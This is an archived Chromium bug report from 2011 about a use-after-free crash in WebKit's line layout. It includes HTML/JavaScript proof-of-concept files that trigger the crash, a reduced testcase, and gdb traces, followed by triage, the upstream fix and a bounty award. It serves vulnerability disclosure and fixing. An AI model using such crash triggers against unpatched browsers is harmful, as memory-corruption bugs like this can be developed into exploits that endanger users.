# Stale text node in linebox due to failure to dirty linebox when that text child is dirtied

| Field | Value |
|-------|-------|
| **Issue ID** | [40087022](https://issues.chromium.org/issues/40087022) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-01-19 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Under certain circumstances, when removing DOM nodes from a DOM tree in an HTML document included on a second page via an iframe, Chromium will crash (caused by a jump to null).

**VERSION**  

Chrome Version: Tested in Google Chrome 8.0.552.237 stable, debugging done in Chromium 8.0.552.224 Ubuntu 10.04  

Operating System: Ubuntu 10.04 (64-bit)

**REPRODUCTION CASE**  

Two files are needed to reproduce this bug. Both are attached as well as included below.

The first file, outer.html, simply creates a 100x100 iframe with a src of inner.html. To reproduce the crash, this file should opened in the browser. It is shown below.

<html>
<head><title>Crash PoC - Outer</title></head>
<body>
<iframe width="100" height="100" src="inner.html"></iframe>
</body>
</html>

The second file, inner.html, is shown below.

<html>
<head><title>Crash PoC - Inner</title></head>
<body onload="boom();">
<audio>a</audio>
<frame>a</frame>
<center></center>
<font id="font"></font>
<img id="img" />
<textflow>aaaaaaaaaaaaaaaaaaaa<bgsound /></textflow>
<wbr id="wbr" />
<spot>aaa<bq>aaaaaaaaaaaaa<table></table></bq></spot>
<abbr id="abbr"></abbr>
<fieldset id="fieldset">a</fieldset>
<script type="text/javascript">
function reference(domNode) {
this.domNode = domNode;
}

function walk(a, currentPrefix, index, domNode) {  

if(domNode == null) return;  

newPrefix = currentPrefix + "\_" + index  

walk(a, currentPrefix, index + 1, domNode.nextSibling);  

walk(a, newPrefix, 0, domNode.firstChild);  

a[newPrefix] = new reference(domNode);  

}

function clear() {  

var a = new Array();  

walk(a, "", 0, document.body);  

for(key in a) {  

document.body.offsetTop;  

a[key].domNode.parentNode.removeChild(a[key].domNode);  

}  

}

function boom() {  

var tn = document.getElementById('font'); tn.parentNode.removeChild(tn); document.getElementById('wbr').appendChild(tn);  

var tn = document.getElementById('fieldset'); tn.parentNode.removeChild(tn); document.getElementById('img').appendChild(tn);  

document.getElementById('img').appendChild(document.getElementById('abbr').cloneNode(false));  

window.setTimeout("clear();", 0);  

}  

</script>

</body>
</html>

The walk and reference functions are helpers for the clear function, which removes all nodes under document.body from their parents.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

A shortened version of the trace through the program in gdb is included below. The full trace is attached.

$ chromium-browser --debug --single-process outer.html

# Env:

# LD\_LIBRARY\_PATH=/usr/lib/chromium-browser

# PATH=/usr/lib/chromium-browser:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# GTK\_PATH=

# CHROMIUM\_USER\_FLAGS=

# CHROMIUM\_FLAGS=

/usr/bin/gdb /usr/lib/chromium-browser/chromium-browser -x /tmp/chromiumargs.FdgvnE  

GNU gdb (GDB) 7.1-ubuntu  

Copyright (C) 2010 Free Software Foundation, Inc.  

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  

This is free software: you are free to change and redistribute it.  

There is NO WARRANTY, to the extent permitted by law. Type "show copying"  

and "show warranty" for details.  

This GDB was configured as "x86\_64-linux-gnu".  

For bug reporting instructions, please see:  

<http://www.gnu.org/software/gdb/bugs/>...  

Reading symbols from /usr/lib/chromium-browser/chromium-browser...Reading symbols from /usr/lib/debug/usr/lib/chromium-browser/chromium-browser...done.  

done.  

(gdb) run  

Starting program: /usr/lib/chromium-browser/chromium-browser --single-process outer.html

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe3c61700 (LWP 18254)]  

0x0000000000000000 in ?? ()  

(gdb) bt  

#0 0x0000000000000000 in ?? ()  

#1 0x00007ffff68ea489 in WebCore::RenderBlock::requiresLineBox (it=...,  

isLineEmpty=true, previousLineBrokeCleanly=false)  

at third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp:1222  

#2 0x00007ffff68f0400 in WebCore::RenderBlock::skipLeadingWhitespace (  

this=0x7ffff8f7aa60, resolver=..., firstLine=<value optimized out>,  

isLineEmpty=<value optimized out>, previousLineBrokeCleanly=false,  

lastFloatFromPreviousLine=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp:1287  

#3 0x00007ffff68f0e33 in WebCore::RenderBlock::findNextLineBreak (  

this=0x7ffff8f7aa60, resolver=<value optimized out>,  

firstLine=<value optimized out>, isLineEmpty=<value optimized out>,  

previousLineBrokeCleanly=<value optimized out>,  

hyphenated=@0x7fffe3c5fa49, clear=0x7fffe3c5fa34,  

lastFloatFromPreviousLine=0x0)  

at third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp:1409  

#4 0x00007ffff68f44bf in WebCore::RenderBlock::layoutInlineChildren (  

this=0x7ffff8f7aa60, relayoutChildren=<value optimized out>,  

repaintLogicalTop=@0x7fffe3c5fb6c, repaintLogicalBottom=@0x7fffe3c5fb68)  

at third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp:664  

#5 0x00007ffff68e8ad8 in WebCore::RenderBlock::layoutBlock (  

this=0x7ffff8f7aa60, relayoutChildren=false, pageHeight=0)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:1211  

---Type <return> to continue, or q <return> to quit---  

<trimmed>  

(gdb) frame 1  

#1 0x00007ffff68ea489 in WebCore::RenderBlock::requiresLineBox (it=...,  

isLineEmpty=true, previousLineBrokeCleanly=false)  

at third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp:1222  

1222 third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp: No such file or directory.  

in third\_party/WebKit/WebCore/rendering/RenderBlockLineLayout.cpp  

(gdb) disassemble  

Dump of assembler code for function \_ZN7WebCore11RenderBlock15requiresLineBoxERKNS\_14InlineIteratorEbb:  

0x00007ffff68ea430 <+0>: mov %rbx,-0x20(%rsp)  

0x00007ffff68ea435 <+5>: mov %rbp,-0x18(%rsp)  

0x00007ffff68ea43a <+10>: mov %rdi,%rbx  

0x00007ffff68ea43d <+13>: mov %r12,-0x10(%rsp)  

0x00007ffff68ea442 <+18>: mov %r13,-0x8(%rsp)  

0x00007ffff68ea447 <+23>: sub $0x28,%rsp  

0x00007ffff68ea44b <+27>: mov 0x8(%rdi),%rdi  

0x00007ffff68ea44f <+31>: mov %esi,%r12d  

0x00007ffff68ea452 <+34>: mov %edx,%ebp  

0x00007ffff68ea454 <+36>: movzbl 0x30(%rdi),%eax  

0x00007ffff68ea458 <+40>: test $0x20,%al  

0x00007ffff68ea45a <+42>: jne 0x7ffff68ea460 <\_ZN7WebCore11RenderBlock15requiresLineBoxERKNS\_14InlineIteratorEbb+48>  

0x00007ffff68ea45c <+44>: test $0x40,%al  

0x00007ffff68ea45e <+46>: je 0x7ffff68ea480 <\_ZN7WebCore11RenderBlock15requiresLineBoxERKNS\_14InlineIteratorEbb+80>  

0x00007ffff68ea460 <+48>: xor %ebp,%ebp  

0x00007ffff68ea462 <+50>: mov %ebp,%eax  

0x00007ffff68ea464 <+52>: mov 0x8(%rsp),%rbx  

0x00007ffff68ea469 <+57>: mov 0x10(%rsp),%rbp  

0x00007ffff68ea46e <+62>: mov 0x18(%rsp),%r12  

---Type <return> to continue, or q <return> to quit---  

0x00007ffff68ea473 <+67>: mov 0x20(%rsp),%r13  

0x00007ffff68ea478 <+72>: add $0x28,%rsp  

0x00007ffff68ea47c <+76>: retq  

0x00007ffff68ea47d <+77>: nopl (%rax)  

0x00007ffff68ea480 <+80>: mov (%rdi),%rax  

0x00007ffff68ea483 <+83>: callq \*0x150(%rax)  

=> 0x00007ffff68ea489 <+89>: test %al,%al  

0x00007ffff68ea48b <+91>: jne 0x7ffff68ea528 <\_ZN7WebCore11RenderBlock15requiresLineBoxERKNS\_14InlineIteratorEbb+248>  

0x00007ffff68ea491 <+97>: mov 0x8(%rbx),%rdi  

0x00007ffff68ea495 <+101>: mov 0x8(%rdi),%rax  

<trimmed>  

(gdb) i r  

rax 0x7ffff90c93c0 140737371739072  

rbx 0x7fffe3c5f7f0 140737014790128  

rcx 0x0 0  

rdx 0x0 0  

rsi 0x1 1  

rdi 0x7ffff8f7ae80 140737370369664  

rbp 0x0 0x0  

rsp 0x7fffe3c5f100 0x7fffe3c5f100  

r8 0x0 0  

r9 0x0 0  

r10 0x0 0  

r11 0x3c 60  

r12 0x1 1  

r13 0x0 0  

r14 0x45 69  

r15 0x0 0  

rip 0x7ffff68ea489 0x7ffff68ea489 <WebCore::RenderBlock::requiresLineBox(WebCore::InlineIterator const&, bool, bool)+89>  

eflags 0x10246 [ PF ZF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

---Type <return> to continue, or q <return> to quit---  

fs 0x0 0  

gs 0x0 0

## Attachments

- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 17.3 KB)
- [inner.html](attachments/inner.html) (text/html; charset=us-ascii, 1.3 KB)
- [outer.html](attachments/outer.html) (text/html; charset=us-ascii, 136 B)

## Timeline

### ch...@gmail.com (2011-01-20)

it.obj points to a freed CachedResourceClient so this is high severity.

### ch...@gmail.com (2011-01-20)

filed upstream at https://bugs.webkit.org/show_bug.cgi?id=52828

### ke...@google.com (2011-01-27)

Move to M11 from M10, as we've now branched.  If you believe this bug was moved in error, please come talk to me.

### js...@chromium.org (2011-01-28)

Moving back to m9.

### js...@chromium.org (2011-01-29)

CC'ing @jamesr on the off-chance he has a thought to contribute.

### in...@chromium.org (2011-02-22)

Reduced testcase::

outer.html
----
<iframe width="100" src="inner.html">

inner.html
----
<body onload="boom();">
<audio>a</audio>a
<center></center>
aaaaaaaaaaaaaaaaaaa
<wbr id="wbr">
<span>aaaaaaaaaaaaa
<script>
function reference(domNode) {
  this.domNode = domNode;
}
function walk(a, currentPrefix, index, domNode) {
  if(domNode == null) return;
  newPrefix = currentPrefix + "_" + index
  walk(a, currentPrefix, index + 1, domNode.nextSibling);
  walk(a, newPrefix, 0, domNode.firstChild);
  a[newPrefix] = new reference(domNode);
}
function clear() {
  var a = new Array();
  walk(a, "", 0, document.body);
  for(key in a) {
    document.body.offsetTop;
    a[key].domNode.parentNode.removeChild(a[key].domNode);
  }
}
function boom() {
  var fnt = document.createElement('font');
  document.getElementById('wbr').appendChild(fnt);
  window.setTimeout("clear();", 0);
}
</script>

### in...@chromium.org (2011-02-25)

I have a fix! filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=55206

### in...@chromium.org (2011-02-25)

Committed r79689: <http://trac.webkit.org/changeset/79689>

### js...@chromium.org (2011-02-28)

[Empty comment from Monorail migration]

### ch...@gmail.com (2011-02-28)

merged to m10 as http://trac.webkit.org/changeset/79910

### sc...@gmail.com (2011-03-03)

@MartyBarbella -- congrats! This bug provisionally qualifies for a $1000 Chromium Security Reward. You seem to be hearing that a lot lately :D
Thanks for taking the trouble to try and keep the repros minimal, and for including stack, register and asm analysis. It's factors like those that cause us to reward at the $1000 level.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-15)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/70027?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087022)*
